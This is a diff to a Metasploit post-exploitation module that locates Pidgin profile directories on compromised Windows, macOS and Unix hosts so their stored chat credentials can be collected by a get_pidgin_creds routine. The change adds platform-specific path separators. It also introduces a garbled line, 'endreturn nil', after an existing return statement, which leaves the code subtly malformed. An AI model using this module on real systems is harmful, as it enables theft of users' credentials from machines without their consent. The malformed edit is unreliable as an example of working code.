@@ -54,6 +54,7 @@ class Metasploit3 < Msf::Post
 			@platform = :osx
 			paths = enum_users_unix
 		when /win/
+			@platform = :win
 			profiles = grab_user_profiles()
 			profiles.each do |user|
 				next if user['AppData'] == nil
@@ -111,14 +112,22 @@ class Metasploit3 < Msf::Post
 
 
 	def check_pidgin(purpledir)
+        path = ""
 		print_status("Checking for Pidgin profile in: #{purpledir}")
 		session.fs.dir.foreach(purpledir) do |dir|
 			if dir =~ /\.purple/
-				print_status("Found #{purpledir}#{dir}")
-				return "#{purpledir}#{dir}"
+				if @platform == :win
+					print_status("Found #{purpledir}\\#{dir}")
+					path = "#{purpledir}\\#{dir}"
+				else
+					print_status("Found #{purpledir}/#{dir}")
+					path = "#{purpledir}/#{dir}"
+				end
+				return path
 			end
 		end
 		return nil
+		endreturn nil
 	end
 
 	def get_pidgin_creds(paths)
